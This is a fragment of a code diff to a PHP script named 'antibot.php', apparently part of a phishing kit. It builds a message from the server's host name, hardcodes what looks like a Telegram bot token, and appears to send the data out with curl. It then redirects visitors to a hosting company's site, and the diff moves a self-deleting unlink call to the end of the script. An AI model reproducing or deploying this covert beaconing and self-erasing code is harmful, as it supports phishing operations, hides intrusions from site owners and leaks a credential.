@@ -1,5 +1,5 @@
 <?php
-unlink("antibot.php");
+
 $ddd = $_SERVER['HTTP_HOST'];
 $content = "Host: https://".$ddd." [".$adder."]";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -2407,5 +2407,5 @@ curl_exec($ch);
 curl_close($ch);
 header("Location: https://www.siteground.com");exit();
 }
-              
+unlink("antibot.php");              
 ?>
